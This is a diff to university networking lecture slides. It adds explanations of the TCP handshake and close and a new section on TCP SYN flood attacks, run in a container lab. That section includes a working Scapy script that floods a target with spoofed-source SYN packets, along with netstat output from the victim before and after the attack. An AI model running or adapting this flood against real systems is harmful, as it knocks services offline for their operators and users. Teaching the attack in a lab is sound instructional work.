@@ -81,10 +81,10 @@
 
 ## Transport tasks to solve
 - Which application receives the data
-- How to split a large file into smaller packets
-- How to handle a lost packet
-- How to handle packet order
-- How to handle packets arriving too fast
+- Splitting a large file into smaller packets
+- Handling a lost packet
+- Handling packet order
+- Handling packets arriving too fast
 - Encryption (TLS)
 
 TCP handles all of these; UDP usually only handles the first one
@@ -185,7 +185,7 @@ Use `sendall()` for TCP sockets, and `sendto()` for UDP sockets
 - UDP packets do not require setting up a connection first
 - Basic idea: have the attacker request data from B
   - But spoof the return address to be of A
-  - This can be a DOS attack against A
+  - This can be a denial of service attack against A
 ![](http://www.cs.virginia.edu/~asb2t/duimg/n05/image5.png)
 
 
@@ -322,15 +322,113 @@ Multiple connections are often handled via threading
 
 
 
-<!-- .slide: class="right-float-img-800" -->
+<!-- .slide: class="right-float-img-1000" -->
 ## TCP Open Connection
 ![](images/graphs/tcp_open.webp)
+- The client sends a packet with SYN set to true
+  - The *random* sequence number is in the sequence field
+- The server responds with SYN and ACK set to true
+  - Acknowledges client's sequence number
+  - Gives its own sequence number
+- The client acknowledges the server's sequence number
 
 
 
-<!-- .slide: class="right-float-img-800" -->
+<!-- .slide: class="right-float-img-1000" -->
 ## TCP Close Connection
 ![](images/graphs/tcp_close.webp)
+- Both sides send a FIN (finished or final), followed by an acknowledgement
+
+
+
+<!-- .slide: class="right-float-img-1000" -->
+## TCP SYN Flood
+![](images/graphs/tcp_syn_attack.webp)
+- Client sends initial SYN
+- Server sends SYN-ACK
+- Client doesn't respond
+- This has a half-open connection
+  - It will time out after some time
+  - But the client can flood this during that time
+    - Can be as long as 40 seconds
+- Servers have a finite number of connections they can have open
+  - This will rapidly fill it up, causing a denial of service attack
+
+
+
+## TCP SYN Flood
+```
+from scapy.all import IP, TCP, send
+from ipaddress import IPv4Address
+from random import getrandbits
+
+ip  = IP(dst="192.168.200.3")  # target
+tcp = TCP(dport=23, flags='S') # set SYN flag
+pkt = ip/tcp
+
+while True:
+    pkt[IP].src    = str(IPv4Address(getrandbits(32)))
+    pkt[TCP].sport = getrandbits(16)
+    pkt[TCP].seq   = getrandbits(32)
+    send(pkt, verbose = 0)
+```
+
+
+
+<!-- .slide: class="small-pre" -->
+## TCP SYN Flood
+- Victim: inner container
+- Attacker: outer1
+- Before:
+```
+root@inner:/# netstat -tna
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.11:37869        0.0.0.0:*               LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+root@inner:/# 
+```
+- After:
+```
+root@inner:/# netstat -tna  | wc -l
+134
+root@inner:/# 
+```
+
+
+
+<!-- .slide: class="small-pre" -->
+## TCP SYN Flood
+- After:
+```
+root@inner:/# netstat -tna   | head
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.11:37869        0.0.0.0:*               LISTEN     
+tcp        0      0 192.168.200.3:22        157.2.61.212:19377      SYN_RECV   
+tcp        0      0 192.168.200.3:22        150.245.31.253:43130    SYN_RECV   
+tcp        0      0 192.168.200.3:22        63.131.251.145:8763     SYN_RECV   
+tcp        0      0 192.168.200.3:22        19.210.38.12:12311      SYN_RECV   
+tcp        0      0 192.168.200.3:22        103.25.66.18:30063      SYN_RECV   
+...
+tcp        0      0 192.168.200.3:22        145.138.123.196:64028   SYN_RECV   
+tcp        0      0 192.168.200.3:22        186.69.148.85:52252     SYN_RECV   
+tcp        0      0 192.168.200.3:22        243.223.132.14:18120    SYN_RECV   
+tcp        0      0 192.168.200.3:22        52.199.88.114:59992     SYN_RECV   
+tcp        0      0 192.168.200.3:22        82.46.211.86:12211      SYN_RECV   
+tcp6       0      0 :::22                   :::*                    LISTEN     
+```
+
+
+
+## TCP SYN Attack Analysis
+- *inner* only reached 130 SYN attack connections
+- Why so few?
+  - Python is slooooooow
 
 
 
